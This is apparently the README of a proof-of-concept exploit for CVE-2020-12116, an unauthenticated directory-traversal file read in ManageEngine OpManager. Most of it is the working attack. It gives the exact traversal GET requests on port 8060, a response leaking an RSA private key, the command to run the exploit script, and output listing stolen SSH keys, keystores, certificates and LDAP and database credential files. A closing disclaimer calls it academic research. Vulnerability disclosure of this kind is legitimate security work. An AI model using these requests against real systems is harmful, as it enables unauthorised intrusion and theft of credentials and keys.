# CVE-2020-12116
Proof of concept code to exploit [CVE-2020-12116](https://nvd.nist.gov/vuln/detail/CVE-2020-12116): Unauthenticated arbitrary file read on [ManageEngine OpManger](https://www.manageengine.com/network-monitoring/help/read-me-complete.html#125125).

## Summary
The latest release of OpManger contains a directory traversal vulnerability that
allows unrestricted access to every file in the OpManager application. This
includes private SSH keys, password protected Java keystores, and configuration
files containing passwords to keystores, private certificates, and the backend
database. If LDAP is configured then domain credentials can be obtained from
"conf/OpManager/ldap.conf".

## Vulnerability Analysis
Make an unauthenticated GET request to the root directory of the ManageEngine
OpManager Application, by default, on port 8060.

```
GET / HTTP/1.1
Host: <HOSTNAME>:8060
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

The response HTML will contain cached javascript "src" URLs.

```
<SCRIPT LANGUAGE="javascript" SRC="/cachestart/125116/cacheend/apiclient/fluidicv2/
javascript/jquery/jquery-3.4.1.min.js"></SCRIPT>
```

The excerpt "SRC" URL above contains a directory traversal vulnerability allowing
for Arbitrary File Reads from the ManageEngine root installation directory. By
default the installation path is "C:\Program Files\ManageEngine\OpManager\".

NOTE: The number after "/cachestart/" is the product build number, but any number
can be used to exploit the vulnerability.

Leveraging the script source URL from the response HTML, a GET request with directory
traversal can be leveraged to read arbitrary files from the remote server.

#### REQUEST:
```
GET /cachestart/125116/cacheend/apiclient/fluidicv2/javascript/jquery/../../../../bin/.ssh_host_rsa_key HTTP/1.1
Host: <HOSTNAME>:8060
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Connection: close
Cache-Control: max-age=0
Referer: http://<HOSTNAME>:8060/
```

#### RESPONSE:
```
HTTP/1.1 200 
Set-Cookie: JSESSIONID=4E221B342BC080BC9AC2D19378364E3B; Path=/; HttpOnly
X-FRAME-OPTIONS: DENY
Accept-Ranges: bytes
ETag: W/"902-1586033949624"
Last-Modified: Sat, 04 Apr 2020 20:59:09 GMT
Vary: Accept-Encoding
Date: Mon, 13 Apr 2020 15:40:01 GMT
Connection: close
Content-Length: 902

-----BEGIN RSA PRIVATE KEY-----
MIICX...pXqnO
-----END RSA PRIVATE KEY-----
```

## Example using provided Python3 exploit code
#### Overview:
```
This script leverages the arbitrary file read vulnerability against ManageEngine
OpManager endpoints to download sensative files, such as private keys, private
keystores, certificates, configuration files containing passwords, etc.
```

#### Command:
```
python3 exploit.py -t <hostname/IP> -p 8060 -d ./
```

#### Output:
```
[+] bin/.ssh_host_dsa_key saved to ./bin|.ssh_host_dsa_key
[+] bin/.ssh_host_dsa_key.pub saved to ./bin|.ssh_host_dsa_key.pub
[+] bin/.ssh_host_rsa_key saved to ./bin|.ssh_host_rsa_key
[+] bin/.ssh_host_rsa_key.pub saved to ./bin|.ssh_host_rsa_key.pub
[+] conf/client.keystore saved to ./conf|client.keystore
[+] conf/customer-config.xml saved to ./conf|customer-config.xml
[+] conf/database_params.conf saved to ./conf|database_params.conf
[+] conf/FirewallAnalyzer/aaa_auth-conf.xml saved to ./conf|FirewallAnalyzer|aaa_auth-conf.xml
[+] conf/FirewallAnalyzer/auth-conf_ppm.xml saved to ./conf|FirewallAnalyzer|auth-conf_ppm.xml
[+] conf/gateway.conf saved to ./conf|gateway.conf
[+] conf/itom.truststore saved to ./conf|itom.truststore
[+] conf/netflow/auth-conf.xml saved to ./conf|netflow|auth-conf.xml
[+] conf/netflow/server.xml saved to ./conf|netflow|server.xml
[+] conf/netflow/ssl_server.xml saved to ./conf|netflow|ssl_server.xml
[+] conf/NFAEE/cs_server.xml saved to ./conf|NFAEE|cs_server.xml
[+] conf/OpManager/database_params.conf saved to ./conf|OpManager|database_params.conf
[+] conf/OpManager/database_params_DE.conf saved to ./conf|OpManager|database_params_DE.conf
[+] conf/OpManager/ldap.conf saved to ./conf|OpManager|ldap.conf
[+] conf/OpManager/MicrosoftSQL/database_params.conf saved to ./conf|OpManager|MicrosoftSQL|database_params.conf
[+] conf/OpManager/POSTGRESQL/database_params.conf saved to ./conf|OpManager|POSTGRESQL|database_params.conf
[+] conf/OpManager/POSTGRESQL/database_params_DE.conf saved to ./conf|OpManager|POSTGRESQL|database_params_DE.conf
[+] conf/OpManager/securitydbData.xml saved to ./conf|OpManager|securitydbData.xml
[+] conf/OpManager/SnmpDefaultProperties.xml saved to ./conf|OpManager|SnmpDefaultProperties.xml
[+] conf/Oputils/snmp/Community.xml saved to ./conf|Oputils|snmp|Community.xml
[+] conf/Persistence/DBconfig.xml saved to ./conf|Persistence|DBconfig.xml
[+] conf/Persistence/persistence-configurations.xml saved to ./conf|Persistence|persistence-configurations.xml
[+] conf/pmp/PMP_API.conf saved to ./conf|pmp|PMP_API.conf
[+] conf/pmp/pmp_server_cert.p12 saved to ./conf|pmp|pmp_server_cert.p12
[+] conf/product-config.xml saved to ./conf|product-config.xml
[+] conf/SANSeed.xml saved to ./conf|SANSeed.xml
[+] conf/server.keystore saved to ./conf|server.keystore
[+] conf/server.xml saved to ./conf|server.xml
[+] conf/system_properties.conf saved to ./conf|system_properties.conf
[+] conf/tomcat-users.xml saved to ./conf|tomcat-users.xml
[+] lib/OPM_APNS_Cert.p12 saved to ./lib|OPM_APNS_Cert.p12
```

## Disclaimer
This proof of concept code has been created for academic research and is not intended to be used against systems except where explicitly authorized. The code is provided as is with no guarentees or promises on its execution. I am not responsible or liable for misuse of this code.
